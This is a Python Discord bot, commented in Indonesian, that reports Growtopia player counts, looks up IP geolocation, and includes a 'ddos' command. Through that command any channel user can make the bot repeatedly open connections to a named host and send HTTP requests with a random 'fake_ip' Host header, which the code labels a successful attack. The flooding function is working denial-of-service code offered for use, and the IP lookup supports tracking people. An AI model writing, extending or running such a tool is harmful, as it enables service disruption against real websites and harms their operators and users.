import requests
import socket
import random
import threading 
import asyncio
import discord
import time
import json
import os
import re
from urllib import request 
from time import sleep
from datetime import datetime

attack_number = 1
port = 80
target = ""
totalattack = 0

YOUR_CHANNEL_ID = ""
TOKEN = ''

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

def get_online_users():
    url = "https://www.growtopiagame.com/detail"
    response = requests.get(url)

    if response.status_code == 200:
        content = response.text
        start_index = content.find('{"online_user":"') + len('{"online_user":"')
        end_index = content.find('","world_day_images":')
        
        online_users = content[start_index:end_index]
        return "Jumlah player online: " + online_users
    else:
        return "Gagal memperoleh data, silahkan cek koneksi internet anda."
import requests

def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        data = response.json()
        public_ip = data['ip']
        return public_ip
    except Exception as e:
        return str(e)

def get_ping_to_discord():
    discord_ip = "discordapp.com"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_time = time.time()
    sock.connect((discord_ip, 80))
    end_time = time.time()
    elapsed_time = end_time - start_time
    sock.close()
    return f"IP Bot: {discord_ip}, Ping: {elapsed_time:.2f} seconds"
    
def get_ip_request(ip_address):
	url = "http://ip-api.com/json/" + ip_address
	r = request.urlopen(url) 
	data = r.read() 
	m = json.loads(data)
	response_text = f'''
        Status: {m['status']}\nIP: {m['query']} \nNegara: {m['country']}\nKode Negara: {m['countryCode']}\nKota: {m['city']}\nWilayah: {m['region']}\nNama Wilayah: {m['regionName']}\nZona Waktu: {m['timezone']}\nISP: {m['isp']}\nOrganisasi: {m['org']}\nKode Pos: {m['zip']}\nGaris Lintang: {m['lat']}\nGaris Bujur: {m['lon']}\nAS: {m['as']} 
         '''
	return response_text
	
async def CommandTerminal():
    while True:
        global YOUR_CHANEL_ID
        user_input = input("$ : ")
        if user_input.startswith("say "):
            kata = user_input[4:]
            print("Sedang Memperoleh Data...")
            await client.wait_until_ready()
            channel = client.get_channel(YOUR_CHANNEL_ID)
            if channel:
                await channel.send(f"Message from terminal: {kata}")

def generate_random_ip():
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return ip
    
def ddos(targets,totalattacks):
	global attack_number
	attack_number = 1
	while attack_number < totalattacks:
		fake_ip = generate_random_ip()
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect((targets, port))
		soc.send(("GET /" + targets + " HTTP/1.1\r\n").encode("ascii"))
		soc.send(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"))
		print(f'''Serangan Berhasil : {targets} : {attack_number} menggunakan : {fake_ip} ; {port} ''')
		attack_number += 1
		soc.close()
		
		if attack_number == totalattacks:
			return totalattacks
			attack_number = 1


@client.event
async def on_ready():
    print(f'Logged in as {client.user.name}')
    print("Internet Local Ip : "+get_public_ip())
    print(get_ping_to_discord()+'\n')
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.lower() == 'gtonline':
        await message.channel.send("Sedang Memperoleh Data...")
        print("Mendapatkan Request Get Online Player")
        await message.channel.send(get_online_users())
        sender_name = message.author.name
        message_content = message.content
        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
        
        log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
        print("Log Message {\n" + log_message + '}')
    elif message.content.lower() in ['hai','hello','hi','hallo','halo','helo']:
        sender_name = message.author.name
        message_content = message.content
        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
        log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
        print("Log Message {\n" + log_message + '}')
        await message.channel.send(message_content+', Apa yang bisa saya bantu ?')
    elif message.content == '!embed':
        embed = discord.Embed(title='Judul Embed', description='Ini adalah contoh pesan embedded.', color=discord.Color.blue())
        embed.add_field(name='Field 1', value='Nilai 1', inline=False)
        embed.add_field(name='Field 2', value='Nilai 2', inline=False)
        embed.set_footer(text='Ini adalah footer')
        await message.channel.send(embed=embed)
    elif message.content.lower().startswith('getip'):
    	ip_address = message.content.lower().replace('getip', '').strip()
    	await message.channel.send("Mendapatkan informasi IP...")
    	print("Mendapatkan Request Ip Tracker " + ip_address)
    	embed = discord.Embed(title='INFORMASI IP '+ip_address, description=get_ip_request(ip_address), color=discord.Color.blue())
    	await message.channel.send(embed=embed)
    	sender_name = message.author.name
    	message_content = message.content
    	timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
    	log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
    	print("Log Message {\n" + log_message + '}')
    elif message.content.lower().startswith('ddos'):
    	pesan = message.content.lower()
    	sender_name = message.author.name
    	message_content = message.content
    	timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
    	log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
    	print("Log Message {\n" + log_message + '}')
    	pola = r'ddos:(?P<ip>[^\s]*) amount:(?P<brp>[^\s]*)'
    	cocok = re.search(pola, pesan)
    	target = str(cocok.group('ip'))
    	jumlah = int(cocok.group('brp'))
    	print("Mendapatkan Request Ddos "+str(target) +" Dengan Jumlah "+str(jumlah))
    	await message.channel.send("Melakukan penyerangan "+str(target)+" "+str(jumlah))
    	await message.channel.send("Berhasil Melakukan Serangan "+str(target)+" Sejumlah "+ str(ddos(target,jumlah)))
    	
client.run(TOKEN)
